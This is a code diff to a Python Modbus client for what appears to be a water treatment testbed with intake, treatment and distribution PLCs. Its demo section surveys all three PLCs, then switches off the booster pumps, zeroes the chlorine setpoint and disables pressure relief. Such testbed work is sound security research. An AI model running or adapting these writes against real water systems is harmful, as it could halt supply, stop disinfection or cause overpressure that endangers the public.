@@ -1,12 +1,49 @@
 """
 Modbus/TCP client for the multi-PLC water treatment testbed.
 
-Address layout (ALL registers are now holding registers / %MW):
-    %MW0-9   : setpoints / counters (configuration + state)
-    %MW10-12 : sensor inputs (written by process simulator)
+All sensor inputs and setpoints live in holding registers (FC 3/6).
+This is because OpenPLC's input registers (%IW) are read-only by the
+Modbus spec, so the simulator could not inject sensor readings.
+
+Address map per PLC:
+
+PLC1 - Intake:
+  Coils (FC 1/5):  0=IntakePump, 1=IntakeValve, 2=LowSourceAlarm, 3=HighFlowAlarm
+  Holding (FC 3/6):
+     0  PumpRuntime         (counter)
+     1  PumpHysteresis      (state)
+     2  TotalIntake         (counter)
+    10  SourceLevel         (sensor, simulator-driven)
+    11  IntakeFlow          (sensor)
+    12  EmergencyStop       (0/1)
+
+PLC2 - Treatment:
+  Coils: 0=ChlorineDoser, 1=AcidDoser, 2=BaseDoser, 3=Mixer,
+         4=ContaminationAlarm, 5=PhAlarm
+  Holding:
+     0  ChlorineSetpoint
+     1  PhSetpointLow
+     2  PhSetpointHigh
+     3  DosingCycles
+    10  TreatmentTankLevel  (sensor)
+    11  ChlorineLevel       (sensor)
+    12  PhLevel             (sensor, scaled x10)
+
+PLC3 - Distribution:
+  Coils: 0=BoosterPump1, 1=BoosterPump2, 2=PressureReliefValve,
+         3=SupplyValve, 4=OverpressureAlarm, 5=LowPressureAlarm
+  Holding:
+     0  PressureSetpoint
+     1  PressureMax
+     2  DailyOutflow
+     3  PumpStaging
+    10  DistributionPressure (sensor)
+    11  OutflowRate          (sensor)
+    12  ReservoirLevel       (sensor)
 """
 
 from __future__ import annotations
+
 import logging
 from dataclasses import dataclass, field
 from typing import Optional
@@ -24,8 +61,7 @@ class PlcTarget:
     name: str
     role: str
     coils: dict[int, str] = field(default_factory=dict)
-    sensors: dict[int, str] = field(default_factory=dict)        # %MW10+ (inputs)
-    holding_registers: dict[int, str] = field(default_factory=dict)  # %MW0-9 (setpoints)
+    holding_registers: dict[int, str] = field(default_factory=dict)
 
 
 PLCS: dict[str, PlcTarget] = {
@@ -33,35 +69,70 @@ PLCS: dict[str, PlcTarget] = {
         host="plc1-intake",
         name="PLC1 - Intake Station",
         role="Water source intake control",
-        sensors={10: "SourceLevel", 11: "IntakeFlow", 12: "EmergencyStop"},
-        coils={0: "IntakePump", 1: "IntakeValve", 2: "LowSourceAlarm", 3: "HighFlowAlarm"},
-        holding_registers={0: "PumpRuntime", 1: "PumpHysteresis", 2: "TotalIntake"},
+        coils={
+            0: "IntakePump",
+            1: "IntakeValve",
+            2: "LowSourceAlarm",
+            3: "HighFlowAlarm",
+        },
+        holding_registers={
+            0: "PumpRuntime",
+            1: "PumpHysteresis",
+            2: "TotalIntake",
+            10: "SourceLevel",
+            11: "IntakeFlow",
+            12: "EmergencyStop",
+        },
     ),
     "treatment": PlcTarget(
         host="plc2-treatment",
         name="PLC2 - Treatment Station",
         role="Chlorine dosing and pH balancing",
-        sensors={10: "TreatmentTankLevel", 11: "ChlorineLevel", 12: "PhLevel"},
-        coils={0: "ChlorineDoser", 1: "AcidDoser", 2: "BaseDoser", 3: "Mixer",
-               4: "ContaminationAlarm", 5: "PhAlarm"},
-        holding_registers={0: "ChlorineSetpoint", 1: "PhSetpointLow",
-                           2: "PhSetpointHigh", 3: "DosingCycles"},
+        coils={
+            0: "ChlorineDoser",
+            1: "AcidDoser",
+            2: "BaseDoser",
+            3: "Mixer",
+            4: "ContaminationAlarm",
+            5: "PhAlarm",
+        },
+        holding_registers={
+            0: "ChlorineSetpoint",
+            1: "PhSetpointLow",
+            2: "PhSetpointHigh",
+            3: "DosingCycles",
+            10: "TreatmentTankLevel",
+            11: "ChlorineLevel",
+            12: "PhLevel",
+        },
     ),
     "distribution": PlcTarget(
         host="plc3-distribution",
         name="PLC3 - Distribution Station",
         role="Pressure regulation and customer supply",
-        sensors={10: "DistributionPressure", 11: "OutflowRate", 12: "ReservoirLevel"},
-        coils={0: "BoosterPump1", 1: "BoosterPump2", 2: "PressureReliefValve",
-               3: "SupplyValve", 4: "OverpressureAlarm", 5: "LowPressureAlarm"},
-        holding_registers={0: "PressureSetpoint", 1: "PressureMax",
-                           2: "DailyOutflow", 3: "PumpStaging"},
+        coils={
+            0: "BoosterPump1",
+            1: "BoosterPump2",
+            2: "PressureReliefValve",
+            3: "SupplyValve",
+            4: "OverpressureAlarm",
+            5: "LowPressureAlarm",
+        },
+        holding_registers={
+            0: "PressureSetpoint",
+            1: "PressureMax",
+            2: "DailyOutflow",
+            3: "PumpStaging",
+            10: "DistributionPressure",
+            11: "OutflowRate",
+            12: "ReservoirLevel",
+        },
     ),
 }
 
 
 class ModbusConnector:
-    def __init__(self, target: PlcTarget, port: int = 502, unit_id: int = 1, timeout: float = 3.0):
+    def __init__(self, target: PlcTarget, port: int = 502, unit_id: int = 1, timeout: float = 3.0) -> None:
         self.target = target
         self.host = target.host
         self.port = port
@@ -79,18 +150,18 @@ class ModbusConnector:
         if self._client:
             self._client.close()
 
-    def __enter__(self):
+    def __enter__(self) -> "ModbusConnector":
         if not self.connect():
             raise ConnectionError(f"Could not connect to {self.host}:{self.port}")
         return self
 
-    def __exit__(self, *exc):
+    def __exit__(self, *exc) -> None:
         self.close()
 
     def read_holding_register(self, address: int) -> int:
         rr = self._client.read_holding_registers(address=address, count=1, slave=self.unit_id)
         if rr.isError():
-            raise ModbusException(f"read_holding({address}) failed: {rr}")
+            raise ModbusException(f"read_holding_register({address}) failed: {rr}")
         return rr.registers[0]
 
     def read_coil(self, address: int) -> bool:
@@ -109,12 +180,10 @@ class ModbusConnector:
         rr = self._client.write_register(address=address, value=value, slave=self.unit_id)
         if rr.isError():
             raise ModbusException(f"write_register({address}, {value}) failed: {rr}")
-        log.info(f"[{self.target.name}] WROTE reg[{address}] = {value}")
+        log.info(f"[{self.target.name}] WROTE holding_register[{address}] = {value}")
 
     def read_full_state(self) -> dict[str, int | bool]:
         state: dict[str, int | bool] = {}
-        for addr, name in self.target.sensors.items():
-            state[name] = self.read_holding_register(addr)
         for addr, name in self.target.coils.items():
             state[name] = self.read_coil(addr)
         for addr, name in self.target.holding_registers.items():
@@ -149,25 +218,35 @@ if __name__ == "__main__":
     print("Multi-PLC water treatment plant survey")
     print("=" * 70)
 
-    print("\n[1] Recon survey:")
-    for key, state in survey_all_plcs().items():
+    print("\n[1] Surveying all PLCs (recon phase):")
+    survey = survey_all_plcs()
+    for key, state in survey.items():
         print_state(PLCS[key].name, state)
 
-    print("\n[2] Attack: force PLC3 booster pumps OFF:")
-    with ModbusConnector(PLCS["distribution"]) as c:
-        c.write_coil(0, False)
-        c.write_coil(1, False)
-        print_state(PLCS["distribution"].name, c.read_full_state())
+    print("\n[2] Sample attack: force PLC3 booster pumps OFF (denial of service):")
+    try:
+        with ModbusConnector(PLCS["distribution"]) as c:
+            c.write_coil(0, False)
+            c.write_coil(1, False)
+            print_state(PLCS["distribution"].name, c.read_full_state())
+    except Exception as e:
+        log.error(f"Attack failed: {e}")
 
-    print("\n[3] Attack: zero PLC2 chlorine setpoint:")
-    with ModbusConnector(PLCS["treatment"]) as c:
-        c.write_register(0, 0)
-        print_state(PLCS["treatment"].name, c.read_full_state())
+    print("\n[3] Sample attack: tamper with PLC2 chlorine setpoint:")
+    try:
+        with ModbusConnector(PLCS["treatment"]) as c:
+            c.write_register(0, 0)
+            print_state(PLCS["treatment"].name, c.read_full_state())
+    except Exception as e:
+        log.error(f"Attack failed: {e}")
 
-    print("\n[4] Attack: disable PLC3 pressure relief (PressureMax=9999):")
-    with ModbusConnector(PLCS["distribution"]) as c:
-        c.write_register(1, 9999)
-        print_state(PLCS["distribution"].name, c.read_full_state())
+    print("\n[4] Sample attack: raise PLC3 PressureMax to disable safety relief:")
+    try:
+        with ModbusConnector(PLCS["distribution"]) as c:
+            c.write_register(1, 9999)
+            print_state(PLCS["distribution"].name, c.read_full_state())
+    except Exception as e:
+        log.error(f"Attack failed: {e}")
 
     print("\n" + "=" * 70)
     print("Survey complete.")
